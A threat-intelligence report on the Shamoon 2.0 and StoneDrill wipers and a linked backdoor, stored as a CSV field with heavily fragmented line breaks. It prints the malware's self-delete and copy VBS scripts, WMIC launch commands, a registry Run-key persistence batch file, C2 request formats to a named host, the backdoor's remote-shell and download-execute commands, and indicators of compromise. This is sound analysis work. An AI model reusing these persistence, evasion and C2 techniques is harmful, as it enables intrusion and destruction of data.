url,mitre_domain,tactic_name,tech_name,tech_id,text,software_id
S
' wipes (or encrypts) the content of the Shamoon
2
.0
components (netinit.exe, ntssrvr32.exe, and wiper module itself). Using the low
-
level disk
access driver makes it poss
ible to wipe the body of a running executable.
P
The next 9 '
P
' letters indicate wiping (or encrypting) of the files placed inside the traditional
user folders: desktop, download, document, desktop, download, document, picture, video,
and music.
M
The '
M
' wipes (or encrypts) the NTFS MFT data on all accessible drives mapped from A: to
Z:, except the system drive.
P
The next two '
P
' letters wipe (or encrypt) files inside the following folders:
<C:
\
Windows
\
System32
\
Drivers> and
<C:
\
Windows
\
System32
\
Config
\
systemprofile>
H
The 10 '
H
' letters wipe (or encrypt)
some
of the partitions from 9 to 0 on hard disks 9
-
0
(SystemBoot and FirmwareBootDevice partitions and partition 0 on the system drive are
skipped
in
this step)
B
The '
B
' l
etter wipes (or encrypts) part of the partition designated as FirmwareBootDevice
O
The final '
O
' wipes (or encrypts) the Master File Table on the system drive, the first sector of
\
Device
\
Harddisk0
\
Partition0, and the
last
part of the SystemBootDevice
partition.
Two minutes after all tasks are completed, the system is rebooted with the following command:
“
shutdown
-
r
-
f
-
t 2
”.
,
Contact:
intelreports@kaspersky.com
14
2.2.4. Low
-
Level Disk Access Driver (DRDISK.SYS)
SHA256
4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6
MD5
1493d342e7a36553c56b2adea150949e
Compiled
2011.12.28 16:51:24 (GMT), VC 2005
Type
I386 Native
Size
27 280 bytes
SHA256
eaee62a8238189e8607b24c463a84c83c2331a43b034484972e4b302bd3634d9
MD5
42f883d029b47f9d490a427091da3f5d
Compiled
2011.12.28
16:51:29 (GMT), VC 2005
Type
AMD64 Native
Size
31 998 bytes
These signed legitimate drivers
form
part of the
EldoS RawDisk product
. This product is
designed to provide direct access to disks and protected files fr
om user
-
mode applications.
Sadly, this functionality has been adopted and abused by multiple threat actors to develop wiper
malware, as in the case of the
original Sh
amoon
or the
Lazarus Destover
malware used in the
infamous Sony Pictures Entertainment attack of 2014. In order to bypass the EldoS RawDisk
drivers’ evaluation period license checks, the
Shamoon 2.0 malware changes the system date
to a random day
between the
1st
and
20th of Aug
ust
, 2012.
2.3. From Shamoon 2.0 to StoneDrill 1.0
StoneDrill has some style similarities to the previously discovered Shamoon
samples.
Particularly interesting is the heavy use of anti
-
emulation techniques in the malware, which
prevents the automated analysis by emulators or sandboxes.
One of the most interesting characteristics is the presence of the Persian language in multipl
e
resource sections.
,
Contact:
intelreports@kaspersky.com
15
Samples of the StoneDrill malware were uploaded multiple times to multiscanner systems from
Saudi Arabia between 27 and 30 November 2016. One StoneDrill victim was also observed in
the Kaspersky Security Network (KSN) in Europe.
2.4
. The StoneDrill wiper
SHA256
62aabce7a5741a9270cddac49cd1d715305c1d0505e620bbeaec6ff9b6fd0260
MD5
0ccc9ec82f1d44c243329014b82d3125
Compiled
1999.02.08 06:15:47 (GMT), VC 2015
Type
I386 GUI EXE
Size
195072 bytes
The malware PE file timestamp is fake
;
however
,
the
authors forgot to alter a timestamp inside
the debug directory. The real timestamp from the debug directory points to: 2016.11.14
21:16:45
,
Contact:
intelreports@kaspersky.com
16
1.
The module highlighted above starts from a heavy anti
-
emulation function that contains
numerous WinA
PI calls with invalid parameters. The goal is to break through the
detection of antivirus emulators and heuristic detection.
2.
The second anti
-
emulation technique is run before the payload execution: this module
creates a hidden dialog window, then finds an
d programmatically clicks the “OK” button
on that dialog. After that, another series of incorrect WinAPI calls follow.
3.
The malware then finds the file path of
the
default Internet browser app by looking into
the following registry keys:
a.
SOFTWARE
\
Microsoft
\
Windows
\
Shell
\
Associations
\
UrlAssociations
\
http
\
Us
erChoice
b.
HKCR
\
%ProgId_val%
\
shell
\
open
\
command
4.
The malware then checks to ensure the browser is not
LaunchWinApp.exe
or is
compiled for the 64
-
bit architecture, in
which
case the path of
“
%PROGRAM_FILESX86%
\
Internet Explorer
\
iexplore.exe
” is used instead.
5.
The default browser is then started and the wiper module is injected into the running
browser memory.
6.
After the successful start of the wiper module, the following script is dropped and
executed: “
%temp%
\
C
-
Dlt
-
C
-
Org
-
T.vbs”
7.
Another temporary file is dropped “%temp%
\
C
-
Dlt
-
C
-
Trsh
-
T.tmp
” which contains the
name of the Injector module; this file is deleted after execution is completed.
WScript.Sleep(10 * 1000)
On Error Resume Next
Set WshShell = CreateObject(""
Scripting.FileSystemObject"")
While WshShell.FileExists(""%selfname%"")
WshShell.DeleteFile ""%selfname%""
Wend
WScript.Sleep(10 * 1000)
WshShell.DeleteFile ""%temp%
\
C
-
Dlt
-
C
-
Org
-
T.vbs""
Set WshShell = Nothing
%temp%
\
C
-
Dlt
-
C
-
Org
-
T.vbs File contents
2.4.1. The Sto
neDrill Disk Wiper Module
SHA256
bf79622491dc5d572b4cfb7feced055120138df94ffd2b48ca629bb0a77514cc
MD5
697c515a46484be4f9597cb4f39b2959
Compiled
2016.11.14 21:16:40 (GMT), VC 2015
Type
I386 GUI EXE
Size
130 560 bytes
Unlike Shamoon, the StoneDrill
disk wiper module is not written onto disk but instead is injected
directly into the user’s preferred browser process memory. This module inherits the second anti
-,
Contact:
intelreports@kaspersky.com
17
emulation trick only (clicking the button on the hidden dialog window); it is also obfuscate
d with
the same alphabet
-
based string encryption. If the browser process privileges do not permit the
raw disk wiping, only the user
-
accessible files are deleted.
Depending on the configuration, this module wipes with random data one of foll
o
wing possible
targets:
●
All accessible physical drives by using the device path “
\
\
.
\
PhysicalDrive
”
●
All accessible logical drives by using device path “
\
\
.
\
X:
”
●
Recursively wipes and deletes files in all folders except “
Windows
” on all accessible
logical drives
●
Places a
special emphasis
on
wiping files named “
asdhgasdasdwqe%digits%
” in the
root folder of the disk.
Just like Shamoon, after the wipe process is completed, the system is rebooted.
2.5. The StoneDrill backdoor
According to the PE timestamps from StoneDrill samp
le
two
and sample
one
(2016.10.19 and
2016.11.14 respectively), this malware file was compiled a month before the previously
described StoneDrill sample. However, internally this tool wrapper (injector) looks like a more
modern evolution of the previously
discussed wiper wrapper.
The sample is generally of low quality, with many unused code blocks, unreliable anti
-
emulation
and few non critical bugs. In some cases functions are executed but the results are not used
:
●
I
s the current user a domain administrat
or
?
●
I
s the antivirus process currently running
?
●
Is the current process running in a virtual environment such as VMware or VirtualBox?
2.6. The StoneDrill Installer/Injector module
SHA256
69530d78c86031ce32583c6800f5ffc629acacb18aac4c8bb5b0e915fc4cc4db
MD5
ac3c25534c076623192b9381f926ba0d
Compiled
2016.10.19 14:26:01 (GMT), VC 2015
Type
I386 GUI EXE
Size
227840
bytes
2.6.1. First step: anti
-
emulation tricks
This module is very similar to
the
above discussed injector module, utilizing the same set of
anti
-
emulation tricks, injection into
the user’s preferred
browser and
VBS
scripts. A distinction in ,
Contact:
intelreports@kaspersky.com
18
this sample is the wide utilization of the WMI command
-
line (WMIC) utility to run tasks such as
running the dropped VBS script or
making
registry modificat
ions.
Strings in this module are encrypted
in
two
ways:
●
Alphabet replacement
●
SSE XOR 0x5235
2.6.
2
. Second step: name construction
and installation
This module checks if it is already running from the “%COMMON_APPDATA%
\
Chrome”
folder.
In cases where the malware is started from a different folder, the installation procedure is
started.
During installation, a name is constructed through concatenation of three randomly selected
strings from the below three sets
–
for example
Power
NetworkProxy, RAMFirewallTransfer,
LocationAgentFramework):
Set1
Intel, AMD, Microsoft, Windows, Java, Adobe, Cisco, SunGard, Query, Location, Power, NFC, DotNet,
MFC, WMI, SQL, Office, Bitlocker, Map, Fingerprint, Packet, Registery, RAM, CPU, ROM, Memory,
Monitor, CDROM, Run
-
time, Task, Ethernet, Application, Lockscreen, Cloud, Browser, Cash, Desktop,
Display
Set2
File, System, Service, Device, Software, Hardware, VM, Network, Performance, Graphic, Engine, Agent,
Data, Wizard, Server, Media, History, Stor
age, Core, boot, Gaming, Firewall
Set3
Manager, Arranger, Controller, Host, Help, Diagnostics, LogOn, Plug, Proxy, Events, Transfer, Policy,
Recovery, Details, Provider, Adapter, CleanUp, Encryption, Extention, APP, Client, Menu, Stub,
Execute, Luncher, F
ramework, Tester, Model, Backup, API
The VBS script “%TEMP%
\
C
-
PDC
-
C
-
Cpy
-
T.vbs
” is then dropped in
%TEMP%
\
On Error Resume Next
Set WshShell = CreateObject(""Scripting.FileSystemObject"")
WshShell.CopyFile ""
%SELF_NAME%
"" , ""
%COMMON_APPDATA%
\
Chrome
\
%SELECTED_NAME%
.exe""
Set WshShell = Nothing
C
-
PDC
-
C
-
Cpy
-
T.vbs body template
The script is executed using the following command to do self
-
copy into the
“%COMMON_APPDATA%
\
Chrome”
folder:
cmd /c WMIC Process Call Create ""C:
\
Windows
\
System32
\
Wscript.exe //N
OLOGO
%TEMP%
\
C
-
PDC
-
C
-
Cpy
-
T.vbs""
Another VBS script named “
C
-
PDI
-
C
-
Cpy
-
T.vbs
” is dropped into %TEMP% folder and executed
in the same method (via WMIC used to make
a
second malware copy with pathname)
“
C:
\
ProgramData
\
InternetExplorer
\
%SELECTED_NAME%Stp.exe
”
,
Contact:
intelreports@kaspersky.com
19
On Error Resume Next
Set WshShell = CreateObject(""Scripting.FileSystemObject"")
WshShell.CopyFile ""
%COMMON_APPDATA%
\
Chrome
\
%SELECTED_NAME%
.exe"" ,
""C:
\
ProgramData
\
InternetExplorer
\
%SELECTED_NAME%
Stp.exe""
C
-
PDI
-
C
-
Cpy
-
T.vbs body template
Pathnames of these
two VBS files as well as
the
initial malware pathname are written into
%TEMP%
\
C
-
Dlt
-
C
-
Trsh
-
T.tmp
file.
At the end of the installation procedure the copy of malware (found in
“%COMMON_APPDATA%
\
Chrome
\
%SELECTED_NAME%
.exe
”) is executed (via “
cmd /c
wmic proce
ss call create
”) and
the
initial process terminate
s
itself.
2.6.
3
.
Third
step
When the malware is started from within the “%COMMON_APPDATA%
\
Chrome
” folder, the
“
FileInfo.txt
” file is created in the same folder and contains the pathname of the first copy of
malware (“%COMMON_APPDATA%
\
Chrome
\
%SELECTED_NAME%
.exe
”)
Then the third copy of the malware is created by the command “
%COMSPEC% /c copy
""%SELFNAME"" %TEMP%
\
bd891.tmp
”, which checks
the
target file to verify if command
execution is successful, then deletes
the bd891.tmp file. The last mentioned is used as another
anti
-
emulation trick in the StoneDrill arsenal.
2.6.
4
.
Fourth
step: Payload injection
The payload is extracted from the resources section, decrypted and unpacked similarly to the
previously describe
d wiper injector module. The difference here is that for the decryption of the
payload module, SSE instructions are used.
In the same style, the payload is injected into the user preferred browser process, with an
additional step after the payload module i
njection: the resource segment responsible for the
payload configuration is replaced in memory with the resource taken from
the
parent module.
After the payload start is attempted, the
VBS
files listed inside
C
-
Dlt
-
C
-
Trsh
-
T.tmp
and
C
-
Dlt
-
C
-
Trsh
-
T.tmp
are d
eleted.
2.6.
5
.
Fifth
step: If not started
If the payload is not started
,
then %TEMP%
\
C
-
Dlt
-
C
-
Org
-
T.vbs
is dropped and executed to
delete initial malware copy.
WScript.Sleep(10 * 1000)
On Error Resume Next
Set WshShell = CreateObject(""Scripting.FileSystemOb
ject"")
While WshShell.FileExists(""
%initial_malware_pathname%
"")
WshShell.DeleteFile ""
%initial_malware_pathname%
""
Wend
,
Contact:
intelreports@kaspersky.com
20
WScript.Sleep(10 * 1000)
WshShell.DeleteFile ""
%TEMP%
\
C
-
Dlt
-
C
-
Org
-
T.vbs""
Set WshShell = Nothing
2.7. StoneDrill
r
emote access payload
module
SHA256
105ee777ad31a58301310719b49c7b6a7e957823e4dabbfeaa6a14e313008c1b
MD5
e3a82d1db3ae8b189d2e1e0a22d6c82f
Compiled
2016.10.19 16:49:36 (GMT), VC 2015
Type
I386 GUI EXE
Size
317 440 bytes
Version
2.0.1610.76
This module is not dropped into disk but injected directly into the user preferred browser
process memory. The module is written in C++ with
the use of
STL classes, with numerous
forgotten debug strings.
2.7.1. First step: Decryption
Strings in this module
are encrypted by ROR, NEG, ADD or simply XOR. An unreliable anti
-
emulation technique is utilized which makes the whole module unstable. The author assumed
that the execution of
the
Sleep function with parameter 4020 milliseconds
would
increase the
system
value of KUSER_SHARED_DATA::InterruptTime to
four
seconds (rounded to
the
nearest
second). If the InterruptTime
is
increased only by
two
seconds this module just exits
immediately
.
In case of other values, the module will crash due
to the
incorrect
decryption of
strings.
The configuration block is then loaded from resources and decrypted by two passes of XOR.
The
original module configuration resource is empty
-
the injector module just patches this
resource
,
replacing the configuration
with
its ow
n. In the configuration block, “
ux
” and “
uy
”
are
the C&C servers, “
Cid
” is part of
the
connection query and seems to be a client ID.
,
Contact:
intelreports@kaspersky.com
21
2.7.2. Second step: Registering autorun of installer (injector) module
The malware reads and de
-
XORs content of the
C:
\
ProgramData
\
InternetExplorer
\
FileInfoStp.txt
file, then deletes and unregisters the
autorun file defined in
FileInfoStp.txt
(autorun key deleted from registry) with the command:
cmd /c REG DELETE HKCU
\
SOFTWARE
\
Microsoft
\
Windows
\
CurrentVersion
\
Run /v Stp
/f
”
Next, the file
C:
\
ProgramData
\
InternetExplorer
\
FileInfoStp.txt
is deleted and replaced by the
command:
cmd /c Copy /Y ""C:
\
ProgramData
\
Chrome
\
FileInfo.txt"" ""C:
\
ProgramData
\
InternetExplorer
\
FileInfoStp.txt""
The malware then drops and executes file %
TEMP%
\
C
-
Strt
-
C
-
Up
-
T.bat
ping 1.0.0.0
-
n 1
-
w 20000 > nul
@ECHO OFF
wmic /NameSpace:
\
\
root
\
default Class StdRegProv Call SetStringValue hDefKey = ""&H80000001""
sSubKeyName = ""Software
\
Microsoft
\
Windows
\
CurrentVersion
\
Run"" sValue
=
""C:
\
ProgramData
\
InternetExplorer
\
%SELECTED_NAME%
Stp.exe"" sValueName = ""Stp""
Del ""
%TEMP%
\
C
-
Strt
-
C
-
Up
-
T.bat""
2.7.3. Third step: C&C server selection
Multiple attempts are made to connect to the hosts configured in the
ux
and
uy
fields
(found in
the samp
le configuration). The malware issues
GET
requests to
“
ct_if/ctpublic/Check_Exist.php
”. The server answering with
the
“
HANW
-
J6YS
-
P81J
-
KSD7
”
string is selected as
the
current live server.
C&C login
The n
ext connection is a login attempt with
the
following request
:
POST
/ HTTP/1.1
Host:
www.eservic.com
User
-
Agent:
Mozilla/5.0 (Windows NT 6.1; rv:23.0) Gecko/20100101 Firefox/23.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept
-
Language:
en
-
US,en;q=0.5
Referer:
http://
www.eservic.com/
Connection:
close
Content
-
Type:
application/x
-
www
-
form
-
urlencoded
Content
-
Length:
96
username=
MD5Sum(login)
&password=
MD5Sum(password)
&button=Login
,
Contact:
intelreports@kaspersky.com
22
2.7.4. Fourth step: Get commands list
During the fourth step, the malware requests
available commands from the C&C
:
GET
/insert/index?id=
%cid_from_config%%random_part_of_client_id%
&hst=
%base64encoded_computer_and_user_
name_cpuid0_checksum%
&ttype=102&sta
te=201
HTTP/1.1
Host: www.eservic.com
Accept: text/html,application/xhtml+xml,applica
tion/xml;q=0.9,*/*;q=0.8
Accept
-
Language: en
-
US,en;q=0.5
Cookie:
%string_received_in_login_step%
Connection: close
Here is a list of the StoneDrill commands
available
:
Command
Internal Help Strings
Command Description
os
1. OS (The is Response the
Operating
System of the Client Machine)
Return details about Windows version, edition,
architecture and environment
version
2. Version (The Response is Version of
Running Product on the Client Machine)
“
2.0.1610.76
” string returned
time
3. Time (The
Response is Current Time of
the Client Machine)
Current system and local time are returned
shell
4. Shell Value (Give You Access the CMD
Console in the Client Machine; Value is
Anything that You Want to Writing in the
CMD Console of the Client Machine and
Execute it)
Stdout/stderr streams of executed “
cmd.exe /C
%value%” command are captured and send back
to CC
screenshot
5. Screenshot (The Response is a JPEG File
of the Screenshot of the Client Machine
Desktop)
1
-
At first the malware takes screenshot into
randomly named
.bmp
file in %TEMP% folder.
2
-
Then takes second screenshot, now with jpeg
compression and store it as
.jpg
file with random
name. In case of success
jpg
creation
bmp
file is
deleted.
3
-
Send scre
enshot file to C&C and delete temporary
files.
delay
6. Delay Value (Adjust the Time
-
Interval for
the Server and Client Communication; Value
can be Between 1000
-
100000; 1000 is High
-
End Speed)
download
7. Download ""From"" ""To"" (Download a File
From ""a UR
L"" To ""a Directory on the Client
Machine"")
Downloaded file initially stored as
“%TEMP%
\
Test.tmp
”, then deXORed with 0xCC
and copied to specified location with VBS script “
C
-
Dled
-
C
-
Cpy
-
T.vbs
” as previously described, file is
then executed with command:
""
cmd
/c WMIC Process Call
Create ,
Contact:
intelreports@kaspersky.com
23
C:
\
Windows
\
System32
\
Wscri
pt.exe //NOLOGO
upload
8. Upload ""From"" (Upload a File From ""a
Directory on the Client Machine"")
update
9. Update ""From"" (Download the New
Version of the Product From ""a URL"" and
Execute it on the
Client Machine)
Downloaded file initially stored with random name
inside %TEMP% folder, then renamed by using
C
-
Uptd
-
C
-
Cpy
-
T.vbs
and
C
-
Up
-
C
-
Dt
-
T.bat
similar to
previous steps
uninstall
10. Uninstall (Uninstall The Running Product
from the Client Machine a
nd Delete All Side
-
Effects)
Unregister autorun with
command:
cmd /c REG DELETE
HKCU
\
SOFTWARE
\
Microsoft
\
Windows
\
CurrentVersion
\
Run
/v Stp /f
Then drop and run
C
-
Un
-
C
-
Instl
-
T.bat
with body:
ping 1.1.1.1
-
n 5
-
w 2000 > nul
RMDIR /S /Q
""C:
\
ProgramData
\
Chrome
\
""
RMDIR /S /Q ""C:
\
ProgramData
\
InternetExplorer
\
""
Del ""
%TEMP%
\
C
-
Un
-
C
-
Instl
-
T.bat""
Then terminates itself.
antivirus
11. Antivirus (The Response is Installed
Antivirus on the Client Machine)
Queries Windows Management Instrumentation
(WMI) database for installed
AntiVirusProduct
details. Runs additional registry
lookups for details of:
Avast
,
McAfee
,
Avg
,
BitDefender
products.
help
12. Help (Response is the List of Supported
Commands in the Current Version of Product
that Running on
the Client Machine)
List title is
""
-
Command List of the Current
Vesrion are:""
2.8. StoneDrill
s
imilarities with Shamoon
Of course, one of the most important questions is the following: are StoneDrill and Shamoon
connected? This is a difficult question t
o answer
.
H
owever, by listing the similarities and
differences between the two,
any
one can come up with their own answer.
Although we used a Yara built on Shamoon samples to find StoneDrill, there are several other
similarities between the two:
●
Both Shamo
on and StoneDril appear to be targeting Saudi organizations.
●
Samples have been compiled around the same time
-
October
-
November 2016.
●
Similar to previous generations of Shamoon, StoneDrill uses encrypted PE resources to
store the actual payload.
,
Contact:
intelreports@kaspersky.com
24
The m
ost important differences include:
●
To avoid detection by emulators and sandboxing tools, the StoneDrill authors used
far
more advanced anti
-
emulation techniques than Shamoon.
●
StoneDrill utilises VBS scripts to run self
-
delete scripts, while Shamoon didn’t
use any
external scripts.
●
A distinction from the Shamoon malware is that the strings encryption in StoneDrill is
performed by alphabet table replacement.
●
StoneDrill does not use drivers during deployment, but rather through memory injection
into the victim
’s preferred browser.
2.9. StoneDrill
s
imilarities with News
B
eef
Our initial analysis of StoneDril revealed some similarities with a threat actor we’ve seen before
-
News
B
eef. While we call
this
the News
B
eef
APT, this group has been reported in the past as
Charming Kitten or Newscaster
(
in 2014
)
.
The similarities between News
B
eef and StoneDrill make us believe there is a
very
strong
connection there. Below we list some of the similarities we observed:
2.9.1.
Winmain Signature
In NewsBeef:
B8 08 00 FE 7F FF 30 8F 44 24 20 68 B4 0F 00 00 FF 15 78 70 44 00 B8 08 00 FE 7F FF 30 8F 44 24 24 8B 4C
24 24 2B 4C 24 20 B8 6B CA 5F 6B F7 E1 C1 EA 16 80 EA 02 88 15 95 71 45 00
In StoneDrill:
B8 08 00 FE 7F FF 30 8F 44 24
14 68 B4 0F 00 00 FF 15 4C B0 63 00 B8 08 00 FE 7F FF 30 8F 44 24 10 8B 44
24 10 33 D2 2B 44 24 14 B9 80 96 98 00 F7 F1 2C 02 A2 61 D6 64 00
,
Contact:
intelreports@kaspersky.com
25
2.9.2. The OS command
In News
B
eef:
In StoneDrill:
,
Contact:
intelreports@kaspersky.com
26
2.9.3. The Update command
In News
B
eef:
In StoneDrill:
2.9.4. The Strings Decryption routine
In News
B
eef:
In StoneDrill:
,
Contact:
intelreports@kaspersky.com
27
2.9.5. The Payload Winmain
In News
B
eef:
In StoneDrill:
2.9.6. Command center name similarities
Besides the technical code similarities listed above, we noticed that the naming scheme for
the
News
B
eef and StoneDrill C&Cs is quite similar. For instance:
StoneDrill
NewsBeef
www.chromup[.]com
www.chrome
-
up[.]date
service1.chrome
-
up[.]date
service.chrome
-
up[.]date
www.eservic[.]com
webmaster.serveirc[.]com
,
Contact:
intelreports@kaspersky.com
28
3. Conclusions
Our discovery of StoneDrill gives another dimension to the existing wave of wiper attacks
against Saudi organizations that started with Shamoon 2.0 in November 2016. Comp
ared to the
new Shamoon 2.0 variants, the most significant difference is the lack of a disk driver used for
direct access during the destructive step. Nevertheless, one does not necessarily need raw disk
access to perform destructive functions at file leve
l, which the malware implements quite
successfully.
Of course, one of the most important questions here is the connection between Shamoon and
StoneDrill. Both wipers appear to have been used against Saudi organizations during a similar
timeframe of October
-
November 2016. Several theories are possible here:
●
StoneDrill is a less
-
used wiper tool
,
deployed in certain situations by the same Shamoon
group
.
●
StoneDrill and Shamoon are used by different groups which are aligned in their interests
.
●
StoneDrill and
Shamoon are used by two different groups which have no connection to
each other and just happen to target Saudi organizations at the same time
.
Taking all factors into account, our opinion is
that
the most likely theory is the second.
Additionally, Stone
Drill appears to be connected with previously reported News
B
eef activity,
which continues to target Saudi organizations. From this point of view, News
B
eef and StoneDrill
appear to be
continuously
focused
on targeting Saudi interests, while Shamoon is a fla
shy,
come
-
and
-
go high impact tool.
In terms of attribution, while Shamoon embeds Arabic
-
Yemen resource language sections,
StoneDrill embeds mostly Persian resource language sections. Geopolitical analysts would be
quick to point out that Iran and Yemen are
both players in
the Iran
-
Saudi Arabia proxy conflict
.
Of course, we do not exclude the possibility of false flags.
Finally, many unanswered question
remain in regards to StoneDrill and News
B
eef. The
discovery of the StoneDrill wiper in Europe is a significant sign
that
the group is expanding
its
destructive attacks outside the Middle East. The target for the attack appears to be a large
corporation wi
th a wide area of activity in the petro
-
chemical sector, with no apparent
connection or interest in Saudi Arabia.
As usual, we will continue to monitor the Shamoon, StoneDrill and News
B
eef attacks. A
presentation about StoneDrill will be given at the Kaspe
rsky Security Analyst Summit
Conference, on April 2
-
6, 2017.
Kaspersky Lab products detect the Shamoon and StoneDrill samples as:
Trojan.Win32.EraseMBR.a
Trojan.Win32.Shamoon.a
,
Contact:
intelreports@kaspersky.com
29
Trojan.Win64.Shamoon.a
Trojan.Win64.Shamoon.b
Backdoor.Win32.RemoteConnection.
d
Trojan.Win32.Inject.wmyv
Trojan.Win32.Inject.wmyt
HEUR:Trojan.Win32.Generic
,
Contact:
intelreports@kaspersky.com
30
4. Appendices
4.1. Indicators of Compromise
4.1.1. Shamoon MD5s
00c417425a73db5a315d23f ac8cb353f
271554cff 73c3843b9282951f 2ea7509
2cd0a5f 1e9bcce6807e57ec8477d222a
33a63f 09e0962313285c0f 0f b654ae11
38f 3bed2635857dc385c5d569bbc88ac
41f 8cd9ac3f b6b1771177e5770537518
5446f 46d89124462ae7aca4f ce420423
548f 6b23799f 9265c01f eef c6d86a5d3
63443027d7b30ef 0582778f 1c11f 36f 3
6a7bff 614a1c2f d2901a5bd1d878be59
6bebb161bc45080200a204f 0a
1d6f c08
7772ce23c23f 28596145656855f d02f c
7946788b175e299415ad9059da03b1b2
7edd88dd4511a7d5bcb91f 2ff 177d29d
7f 399a3362c4a33b5a58e94b8631a3d5
8405aa3d86a22301ae62057d818b6b68
8712cea8b5e3ce0073330f d425d34416
8f be990c2d493f 58a2af a2b746e49c86
940cee0d5985960b4
ed265a859a7c169
9d40d04d64f 26a30da893b7a30da04eb
aae531a922d9cca9ddca3d98be09f 9df
ac8636b6ad8f 946e1d756cd4b1ed866d
af 053352f e1a02ba8010ec7524670ed9
b4ddab362a20578dc6ca0bc8cc8ab986
baa9862b027abd61b3e19941e40b1b2d
c843046e54b755ec63ccb09d0a689674
d30cf a003ebf cd4d7c659a73a8dce11e
,
Contact:
intelreports@kaspersky.com
31
da3d900f 8b090c705e8256e1193a18ec
dc79867623b7929f d055d94456be8ba0
ec010868e3e4c47239bf 720738e058e3
ef ab909e4d089b8f 5a73e0b363f 471c1
4.1.2. StoneDrill MD5s
ac3c25534c076623192b9381f 926ba0d
0ccc9ec82f 1d44c243329014b82d3125
8e67f 4c98754a2373a49eaf 53425d79a
f b21f 3cea1aa051ba2a45e75d46b98b8
4.1.3. StoneDrill C2s
www.eservic[.]com
www.securityupdated[.]com
www.actdire[.]com
www.chromup[.]com
4.1.4. NewsBeef C2s
www.chrome
-
up[.]date
service1.chrome
-
up[.]date
service.chrome
-
up[.]d
ate
webmaster.serveirc[.]com
